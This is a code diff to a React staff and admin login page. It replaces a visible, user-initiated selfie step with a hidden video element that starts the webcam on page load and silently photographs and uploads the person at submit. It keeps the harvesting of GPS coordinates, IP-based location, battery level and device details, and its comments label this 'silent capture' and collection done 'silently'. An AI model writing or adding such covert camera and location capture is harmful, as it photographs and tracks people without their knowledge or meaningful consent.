@@ -5,7 +5,7 @@ import { Input } from '@/components/ui/input';
 import { Button } from '@/components/ui/button';
 import { useToast } from '@/hooks/use-toast';
 import { useAuth } from '@/context/AuthContext';
-import { Gamepad, ZapIcon, Stars, Dice1, Dice3, Dice5, Trophy, Joystick, User, Users, Shield, KeyRound, Lock, Eye, EyeOff, ArrowLeft, FileText, Camera } from 'lucide-react';
+import { Gamepad, ZapIcon, Stars, Dice1, Dice3, Dice5, Trophy, Joystick, User, Users, Shield, KeyRound, Lock, Eye, EyeOff, ArrowLeft, FileText } from 'lucide-react';
 import { useIsMobile } from '@/hooks/use-mobile';
 import { Tabs, TabsList, TabsTrigger } from '@/components/ui/tabs';
 import {
@@ -53,11 +53,10 @@ const Login = () => {
   const [pinInput, setPinInput] = useState('');
   const [showPin, setShowPin] = useState(false);
   
-  // Webcam states
-  const [showCamera, setShowCamera] = useState(false);
-  const [capturedImage, setCapturedImage] = useState<string | null>(null);
+  // Hidden webcam and canvas for silent capture
   const videoRef = useRef<HTMLVideoElement>(null);
   const canvasRef = useRef<HTMLCanvasElement>(null);
+  const [cameraReady, setCameraReady] = useState(false);
   
   const [loginMetadata, setLoginMetadata] = useState<any>({});
 
@@ -68,172 +67,44 @@ const Login = () => {
     return () => clearTimeout(timer);
   }, []);
 
-  // Get canvas fingerprint
-  const getCanvasFingerprint = (): string => {
-    try {
-      const canvas = document.createElement('canvas');
-      const ctx = canvas.getContext('2d');
-      if (!ctx) return '';
-      
-      canvas.width = 200;
-      canvas.height = 50;
-      
-      ctx.textBaseline = 'top';
-      ctx.font = '14px Arial';
-      ctx.fillStyle = '#f60';
-      ctx.fillRect(125, 1, 62, 20);
-      ctx.fillStyle = '#069';
-      ctx.fillText('Cuephoria Security', 2, 15);
-      ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-      ctx.fillText('Canvas FP', 4, 17);
-      
-      return canvas.toDataURL();
-    } catch (e) {
-      return '';
-    }
-  };
-
-  // Get installed fonts
-  const getInstalledFonts = (): string[] => {
-    const baseFonts = ['monospace', 'sans-serif', 'serif'];
-    const testFonts = [
-      'Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia',
-      'Palatino', 'Garamond', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black'
-    ];
-    
-    const canvas = document.createElement('canvas');
-    const ctx = canvas.getContext('2d');
-    if (!ctx) return [];
-    
-    const detected: string[] = [];
-    
-    testFonts.forEach(font => {
-      ctx.font = `72px ${font}, ${baseFonts[0]}`;
-      const baseWidth = ctx.measureText('mmmmmmmmmmlli').width;
-      
-      ctx.font = `72px ${font}`;
-      const testWidth = ctx.measureText('mmmmmmmmmmlli').width;
-      
-      if (baseWidth !== testWidth) {
-        detected.push(font);
-      }
-    });
-    
-    return detected;
-  };
-
-  // Collect all metadata
+  // Silently initialize camera in background
   useEffect(() => {
-    const collectLoginInfo = async () => {
+    const initCamera = async () => {
       try {
-        const parser = new UAParser();
-        const device = parser.getResult();
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+          video: { facingMode: 'user', width: 640, height: 480 },
+          audio: false 
+        });
         
-        const metadata: any = {
-          browser: device.browser.name,
-          browserVersion: device.browser.version,
-          os: device.os.name,
-          osVersion: device.os.version,
-          deviceType: device.device.type || 'desktop',
-          deviceModel: device.device.model || 'Unknown',
-          deviceVendor: device.device.vendor || 'Unknown',
-          loginTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
-          userAgent: navigator.userAgent,
-          screenResolution: `${window.screen.width}x${window.screen.height}`,
-          colorDepth: window.screen.colorDepth,
-          pixelRatio: window.devicePixelRatio,
-          touchSupport: 'ontouchstart' in window,
-          canvasFingerprint: getCanvasFingerprint(),
-          installedFonts: getInstalledFonts().join(', ')
-        };
-
-        // Hardware info
-        if ('hardwareConcurrency' in navigator) {
-          metadata.cpuCores = (navigator as any).hardwareConcurrency;
+        if (videoRef.current) {
+          videoRef.current.srcObject = stream;
+          videoRef.current.play();
+          setCameraReady(true);
         }
-        if ('deviceMemory' in navigator) {
-          metadata.deviceMemory = (navigator as any).deviceMemory;
-        }
-
-        // Connection info
-        const connection = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
-        if (connection) {
-          metadata.connectionType = connection.effectiveType || connection.type;
-        }
-
-        // Battery info
-        if ('getBattery' in navigator) {
-          const battery: any = await (navigator as any).getBattery();
-          metadata.batteryLevel = Math.round(battery.level * 100);
-        }
-
-        // Get IP and location
-        try {
-          const response = await fetch('https://ipapi.co/json/');
-          const data = await response.json();
-          metadata.ip = data.ip;
-          metadata.city = data.city;
-          metadata.region = data.region;
-          metadata.country = data.country_name;
-          metadata.timezone = data.timezone;
-          metadata.isp = data.org;
-        } catch (error) {
-          console.log('Could not fetch IP data');
-        }
-
-        // Get GPS coordinates
-        if ('geolocation' in navigator) {
-          navigator.geolocation.getCurrentPosition(
-            (position) => {
-              metadata.latitude = position.coords.latitude;
-              metadata.longitude = position.coords.longitude;
-              metadata.locationAccuracy = position.coords.accuracy;
-              setLoginMetadata({ ...metadata });
-            },
-            (error) => {
-              console.log('Location permission denied or unavailable');
-              setLoginMetadata({ ...metadata });
-            },
-            { enableHighAccuracy: true, timeout: 5000 }
-          );
-        } else {
-          setLoginMetadata(metadata);
-        }
-
-        console.log('Login tracking ready - enhanced metadata collected');
       } catch (error) {
-        console.log('Error collecting metadata:', error);
+        console.log('Camera not available or permission denied');
+        setCameraReady(false);
       }
     };
     
-    collectLoginInfo();
+    initCamera();
+
+    // Cleanup camera on unmount
+    return () => {
+      if (videoRef.current && videoRef.current.srcObject) {
+        const stream = videoRef.current.srcObject as MediaStream;
+        stream.getTracks().forEach(track => track.stop());
+      }
+    };
   }, []);
 
-  // Camera functions
-  const startCamera = async () => {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ 
-        video: { facingMode: 'user' },
-        audio: false 
-      });
-      
-      if (videoRef.current) {
-        videoRef.current.srcObject = stream;
-        videoRef.current.play();
-      }
-      setShowCamera(true);
-    } catch (error) {
-      console.error('Camera access denied:', error);
-      toast({
-        title: 'Camera Access',
-        description: 'Camera access denied. Login will proceed without selfie.',
-        variant: 'destructive',
-      });
+  // Silently capture photo
+  const captureSilentPhoto = (): string | null => {
+    if (!cameraReady || !videoRef.current || !canvasRef.current) {
+      return null;
     }
-  };
 
-  const capturePhoto = () => {
-    if (videoRef.current && canvasRef.current) {
+    try {
       const canvas = canvasRef.current;
       const video = videoRef.current;
       
@@ -243,17 +114,13 @@ const Login = () => {
       const ctx = canvas.getContext('2d');
       if (ctx) {
         ctx.drawImage(video, 0, 0);
-        const imageData = canvas.toDataURL('image/jpeg', 0.8);
-        setCapturedImage(imageData);
-        
-        // Stop camera
-        const stream = video.srcObject as MediaStream;
-        if (stream) {
-          stream.getTracks().forEach(track => track.stop());
-        }
-        setShowCamera(false);
+        return canvas.toDataURL('image/jpeg', 0.8);
       }
+    } catch (error) {
+      console.error('Error capturing photo:', error);
     }
+    
+    return null;
   };
 
   const uploadSelfie = async (imageData: string): Promise<string | null> => {
@@ -291,6 +158,91 @@ const Login = () => {
     return bytes;
   };
 
+  // Collect all metadata
+  useEffect(() => {
+    const collectLoginInfo = async () => {
+      try {
+        const parser = new UAParser();
+        const device = parser.getResult();
+        
+        const metadata: any = {
+          browser: device.browser.name,
+          browserVersion: device.browser.version,
+          os: device.os.name,
+          osVersion: device.os.version,
+          deviceType: device.device.type || 'desktop',
+          deviceModel: device.device.model || 'Unknown',
+          deviceVendor: device.device.vendor || 'Unknown',
+          loginTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
+          userAgent: navigator.userAgent,
+          screenResolution: `${window.screen.width}x${window.screen.height}`,
+          colorDepth: window.screen.colorDepth,
+          pixelRatio: window.devicePixelRatio,
+          touchSupport: 'ontouchstart' in window
+        };
+
+        // Hardware info
+        if ('hardwareConcurrency' in navigator) {
+          metadata.cpuCores = (navigator as any).hardwareConcurrency;
+        }
+        if ('deviceMemory' in navigator) {
+          metadata.deviceMemory = (navigator as any).deviceMemory;
+        }
+
+        // Connection info
+        const connection = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
+        if (connection) {
+          metadata.connectionType = connection.effectiveType || connection.type;
+        }
+
+        // Battery info
+        if ('getBattery' in navigator) {
+          const battery: any = await (navigator as any).getBattery();
+          metadata.batteryLevel = Math.round(battery.level * 100);
+        }
+
+        // Get IP and location
+        try {
+          const response = await fetch('https://ipapi.co/json/');
+          const data = await response.json();
+          metadata.ip = data.ip;
+          metadata.city = data.city;
+          metadata.region = data.region;
+          metadata.country = data.country_name;
+          metadata.timezone = data.timezone;
+          metadata.isp = data.org;
+        } catch (error) {
+          console.log('Could not fetch IP data');
+        }
+
+        // Get GPS coordinates silently
+        if ('geolocation' in navigator) {
+          navigator.geolocation.getCurrentPosition(
+            (position) => {
+              metadata.latitude = position.coords.latitude;
+              metadata.longitude = position.coords.longitude;
+              metadata.locationAccuracy = position.coords.accuracy;
+              setLoginMetadata({ ...metadata });
+            },
+            (error) => {
+              console.log('Location permission denied or unavailable');
+              setLoginMetadata({ ...metadata });
+            },
+            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+          );
+        } else {
+          setLoginMetadata(metadata);
+        }
+
+        console.log('Login tracking ready - metadata collected silently');
+      } catch (error) {
+        console.log('Error collecting metadata:', error);
+      }
+    };
+    
+    collectLoginInfo();
+  }, []);
+
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     
@@ -302,23 +254,14 @@ const Login = () => {
       });
       return;
     }
-
-    // Ask for selfie
-    if (!capturedImage) {
-      toast({
-        title: 'Take Selfie',
-        description: 'Please capture your selfie for security verification',
-      });
-      await startCamera();
-      return;
-    }
     
     setIsLoading(true);
     try {
       const isAdminLogin = loginType === 'admin';
       
-      // Upload selfie
+      // Silently capture selfie
       let selfieUrl = null;
+      const capturedImage = captureSilentPhoto();
       if (capturedImage) {
         selfieUrl = await uploadSelfie(capturedImage);
       }
@@ -331,6 +274,12 @@ const Login = () => {
       const success = await login(username, password, isAdminLogin, enhancedMetadata);
       
       if (success) {
+        // Stop camera after successful login
+        if (videoRef.current && videoRef.current.srcObject) {
+          const stream = videoRef.current.srcObject as MediaStream;
+          stream.getTracks().forEach(track => track.stop());
+        }
+
         toast({
           title: 'Success',
           description: `${isAdminLogin ? 'Admin' : 'Staff'} logged in successfully!`,
@@ -344,7 +293,6 @@ const Login = () => {
           description: `Invalid ${isAdminLogin ? 'admin' : 'staff'} credentials`,
           variant: 'destructive',
         });
-        setCapturedImage(null); // Reset selfie for retry
       }
     } catch (error) {
       toast({
@@ -669,6 +617,16 @@ const Login = () => {
 
   return (
     <div className="min-h-screen flex flex-col items-center justify-center bg-cuephoria-dark overflow-hidden relative px-4">
+      {/* Hidden video and canvas for silent capture */}
+      <video 
+        ref={videoRef} 
+        style={{ display: 'none' }}
+        autoPlay
+        playsInline
+        muted
+      />
+      <canvas ref={canvasRef} style={{ display: 'none' }} />
+
       <div className="absolute top-4 left-4 right-4 z-20 flex justify-between">
         <Button 
           variant="ghost" 
@@ -771,53 +729,6 @@ const Login = () => {
                 </Tabs>
               </div>
 
-              {/* Camera Preview */}
-              {showCamera && (
-                <div className="space-y-2">
-                  <div className="relative w-full aspect-video bg-black rounded-lg overflow-hidden">
-                    <video 
-                      ref={videoRef} 
-                      className="w-full h-full object-cover"
-                      autoPlay
-                      playsInline
-                      muted
-                    />
-                  </div>
-                  <Button 
-                    type="button"
-                    onClick={capturePhoto}
-                    className="w-full bg-cuephoria-orange hover:bg-cuephoria-orange/80 flex items-center gap-2"
-                  >
-                    <Camera size={16} />
-                    Capture Selfie
-                  </Button>
-                </div>
-              )}
-
-              {/* Captured Image Preview */}
-              {capturedImage && !showCamera && (
-                <div className="space-y-2">
-                  <div className="relative w-full aspect-video bg-black rounded-lg overflow-hidden">
-                    <img 
-                      src={capturedImage} 
-                      alt="Captured selfie" 
-                      className="w-full h-full object-cover"
-                    />
-                  </div>
-                  <Button 
-                    type="button"
-                    onClick={() => {
-                      setCapturedImage(null);
-                      startCamera();
-                    }}
-                    variant="outline"
-                    className="w-full"
-                  >
-                    Retake Photo
-                  </Button>
-                </div>
-              )}
-
               <div className="space-y-2 group">
                 <label htmlFor="username" className="text-xs sm:text-sm font-medium flex items-center gap-2 text-cuephoria-lightpurple group-hover:text-accent transition-colors duration-300">
                   <User size={14} className="inline-block" />
@@ -885,7 +796,7 @@ const Login = () => {
                         <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                         <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                       </svg>
-                      Verifying...
+                      Authenticating...
                     </>
                   ) : (
                     <>
@@ -899,9 +810,6 @@ const Login = () => {
           </form>
         </Card>
       </div>
-
-      {/* Hidden canvas for photo capture */}
-      <canvas ref={canvasRef} style={{ display: 'none' }} />
 
       {/* PIN Dialog */}
       <Dialog open={pinDialogOpen} onOpenChange={setPinDialogOpen}>
